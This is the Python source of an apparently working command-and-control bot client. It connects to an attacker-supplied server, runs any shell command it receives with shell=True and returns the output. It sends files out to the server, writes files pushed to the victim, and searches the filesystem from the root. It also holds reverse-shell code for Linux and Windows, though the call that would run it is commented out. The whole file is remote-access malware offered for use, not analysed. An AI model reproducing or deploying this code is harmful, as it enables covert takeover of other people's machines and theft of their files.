#!/usr/bin/env python3

import socket, subprocess, time, argparse, base64, platform, threading, os

parser = argparse.ArgumentParser("C2_Client")
parser.add_argument("-i", "--ip", help="IP address of the C2 server")
args = parser.parse_args()

# ip = input("1")
# ports = [81, 443, 696, 4444, 5555, 7777, 8000]
ports = [8000, 8001]


# TODO: Add shell dropdown capabilities
def reverse_shell(socket, os_family):
    # RHOST = ip  # IP address of the listener
    # RPORT = port  # Port of the listener
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((RHOST, RPORT))
    s = socket
    if os_family == "Linux":
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    elif os_family == "Windows":
        def s2p(s, p):
            while True:
                data = s.recv(1024)
                if len(data) > 0:
                    p.stdin.write(data)
                    p.stdin.flush()

        def p2s(s, p):
            while True:
                s.send(p.stdout.read(1))

        
        p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            s.close()

def base64_decode(data):
    """This function removes the delimter from the encoded data as well as the padding
    Args:
        data (bytes): The encoded data
    Returns:
        decoded_data (bytes): The decoded data
    """
    # Establish the delimiter
    delim = b'!!#@'
    # Remove the delimiter
    data = data.split(delim)[0]
    # Remove the padding and return the decoded data
    return base64.b64decode(data).replace(b'=', b'')

def base64_encode(data):
    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
    Args:
        data (_type_:bytes): The data to encode
    Returns:
        _type_: bytes
    """
    # Establish the delimiter
    delim = b'!!#@'
    # Check if the length of the data is divisible by 4
    if len(data) % 4 != 0:
        # If not, add padding to the end of the data
        data += b'=' * (4 - (len(data) % 4))
    # Encode the data and add the delimiter
    return base64.b64encode(data) + delim

def send_file(socket, file_name):
    """This function sends a file to the C2 server
    Args:
        socket (Socket.Object): The socket to send data to
        file_name (str): The name of the file to send
    """
    try:  # Try to open the file
        with open(file_name, "rb") as f:
            data = f.read()
            data = base64_encode(data)
            socket.sendall(data)
    except:  # If the file cannot be opened, send an error message
        socket.sendall(base64_encode(b"[-] File not found"))

def receive_data(socket):
    """This function receives the data from the socket and returns it
    Args:
        socket (_type_): The socket to receive data from
    Returns:
        _type_: bytes
    """
    # Create a list to hold the fragments of data, dramatically increases speed
    fragments = []
    # While loop to receive the data
    while True:
        # Each fragment is 4096 bytes
        chunk = socket.recv(4096)
        # If the length of the chunk is less than 4096, we have received all the data
        if  len(chunk) < 4096:
            # Append the last chunk to the list and break out of the loop
            fragments.append(chunk)
            break
        # Append the chunk to the list
        fragments.append(chunk)
    full_data = b''.join(fragments)
    return full_data

def file_search(socket, file_name, starting_directory):
    # Loop through the directories
    for root, dirs, filenames in os.walk(starting_directory):
        # Loop through the files
        for file in filenames:
            # If the file name matches the file we are looking for
            if file == file_name:
                # send the absolute path of the file
                # TODO: prompt the user to download the file
                socket.sendall(base64_encode( b'File found at' + os.path.join(root, file).encode()))
                return
    

def main(ip, ports):
    """This function creates a bot and connects to the C2 server. It then waits for commands from the C2 server.
    Allows a remote user to execute commands on the bot and receive the output. Includes the ability to upload and download files.
    Args:
        ip (str): The IP address of the C2 server
        ports (list): A list of ports to try to connect to
    """
    start_dir = os.getcwd()  # Get the current working directory
    c2_bot = socket.socket()  # Create the socket
    user_home = os.path.expanduser('~')  # Get the user's home directory
    running = True
    # Uncomment below block to continuously attempt to connect to the C2 server
    # while running:
    for port in ports:  # Loop through the ports
        try:  # Try to connect to the C2 server
            c2_bot.connect((ip, port))
            print(f"Connected on port {port}")  # Print the port we connected on
            os_family = platform.system()  # Get the OS family
            c2_bot.sendall(base64_encode(os_family.encode()))  # Send the OS family to the C2 server
            while True:  # Loop to receive commands from the C2 server
                command = (c2_bot.recv(4096)).decode()  # Receive the command from the C2 server
                # print(command)  # Troubleshooting print statement
                file_name = ""  # Initialize the file name variable
                if command.lower() == "quit":  # If the command is quit, break out of the loop and close the connection
                    running = False
                    break
                elif "download" == command.split(" ")[0].lower():  # If the command is download, send the file to the C2 server
                    print("download")  # Troubleshooting print statement
                    file_name = command.split(" ")[1]  # Get the file name
                    command = command.split(" ")[0]  # Get the command
                    send_file(c2_bot, file_name)  # Send the file to the C2 server
                # TODO: Re-enable shell functionality
                # elif "shell" in command:  
                #     print("shell")
                #     reverse_shell(c2_bot, os_family)
                elif "upload" == command.split(" ")[0].lower():  # If the command is upload, receive the file from the C2 server
                    print("upload")
                    # print(command)
                    # TODO: Implement upload functionality
                    file_name = command.split(" ")[1]
                    file_destination = command.split(" ")[2]
                    command = command.split(" ")[0]
                    print(f"File name: {file_name}\nFile destination: {file_destination}")  # Troubleshooting print statement
                    data = receive_data(c2_bot)
                    print("Received data")  # Troubleshooting print statement
                    data = base64_decode(data)
                    try:
                        with open(file_destination, "wb") as f:  
                            f.write(data)
                    except:
                        print("[-] Error writing file")
                        c2_bot.sendall(base64_encode(b"[-] Error writing file"))
                elif "cd" in command.split(" ")[0].lower():  # If the command is cd, change the directory
                    print("cd")  # Troubleshooting print statement
                    directory = command.split(" ")[1]  # Get the directory
                    if directory == "~":  # If the directory is ~, change to the user's home directory
                        directory = user_home  # Set the directory to the user's home directory
                    os.chdir(directory)  # Change the directory
                    current_dir = os.getcwd()  # Get the current working directory
                    c2_bot.sendall(base64_encode(f'Now in {current_dir}'.encode()))  # Send the current working directory to the C2 server
                elif "search" == command.split(" ")[0].lower():  # If the command is search, search for the file
                    print("search")
                    file_name = command.split(" ")[1]  # Get the file name
                    if command.split(" ")[2] == "":  # If the directory is blank, search the root directory
                        if os_family == "Windows":  # If the OS is Windows, start search at C:\
                            starting_directory = "C:\\"
                        else:  # If the OS is Linux, start search at /
                            starting_directory = "/"
                    else:
                        starting_directory = command.split(" ")[2]  # Get the starting directory
                    command = command.split(" ")[0]
                    file_search(c2_bot, file_name, starting_directory)  # Search for the file
                else:  # If the command is not quit, download, upload, cd, or search, execute the command
                    print("default")  # Troubleshooting print statement
                    try:  # Try to execute the command
                        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)  # Execute the command
                        return_code = result.returncode
                        c2_bot.sendall(base64_encode(result.stdout + result.stderr))  # Send the output of the command to the C2 server
                    except:
                        c2_bot.sendall(base64_encode(b"[-] Command failed"))  # Send an error message to the C2 server
            break
        except:
            print(f"Connection failed on port {port}")  # Print the port we failed to connect on
            time.sleep(1)  # Wait 1 second before trying the next port
    c2_bot.close()  # Close the connection
    exit()

main(args.ip, ports)